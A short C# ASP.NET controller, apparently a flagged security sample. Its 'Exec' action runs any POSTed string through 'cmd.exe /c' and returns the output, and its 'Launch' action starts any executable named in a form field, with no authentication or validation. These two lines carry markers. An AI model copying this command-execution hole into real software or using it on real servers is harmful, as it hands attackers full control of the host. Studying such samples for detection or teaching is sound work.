using System.Diagnostics;
using Microsoft.AspNetCore.Mvc;

namespace Ops.Controllers;

public class RunController : Controller
{
    [HttpPost]
    public IActionResult Exec(string cmd)
    {
~>        using var p = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + cmd) { RedirectStandardOutput = true });
        return Content(p!.StandardOutput.ReadToEnd());
    }

    [HttpPost]
    public IActionResult Launch()
    {
~>        Process.Start(Request.Form["exe"].ToString());
        return Ok();
    }
}
